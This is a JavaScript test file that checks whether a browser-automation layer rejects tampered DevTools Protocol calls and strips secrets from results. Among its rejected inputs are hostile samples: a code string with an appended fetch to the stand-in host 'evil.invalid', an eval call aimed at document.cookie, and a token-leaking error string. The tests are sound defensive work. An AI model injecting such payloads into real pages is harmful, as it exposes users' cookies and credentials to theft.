import {test} from 'node:test';
import assert from 'node:assert/strict';
import {PORTAL_FUNCTION,validPortalCall,sanitizePortalResult} from '../src/flow-dom.mjs';
import {runCdpCommand} from '../src/cdp.mjs';
import {FakeBrowser} from './helpers/fakes.mjs';
test('CDP accepts exact source declaration with validated arguments only; strings/errors/URLs sanitize closed',async()=>{
  const p={objectId:'fixture-global',functionDeclaration:PORTAL_FUNCTION,arguments:[{value:'observe'},{value:null}],returnByValue:true,awaitPromise:false};
  assert.equal(validPortalCall(p),true);
  const b=new FakeBrowser();
  for(const change of [{functionDeclaration:PORTAL_FUNCTION+';fetch("https://evil.invalid")'},{arguments:[{value:'eval'},{value:'document.cookie'}]},{arguments:[{value:'password'},{value:{password:'secret',phrase:'p',allowUnreadablePhrase:'yes'}}]},{executionContextId:123},{returnByValue:false}]) {
    assert.equal(validPortalCall({...p,...change}),false);
    await assert.rejects(runCdpCommand(b,'fixture','fixture','Runtime.callFunctionOn',{...p,...change}),{code:'cdp-method-denied'});
  }
  assert.equal(b.remoteCallCount(),0);
  for(const raw of ['error https://evil.invalid/?token=secret',new Error('secret'),{code:'secret',host:'idme'},null]) assert.equal(sanitizePortalResult(raw),null);
  const good={code:'observed',host:'idme',login:true,verification:false,dashboard:false,application:false,attendance:false,school:false};
  assert.deepEqual(sanitizePortalResult({...good,href:'https://idme.moe.gov.my/?token=secret',error:'secret'}),good);
});
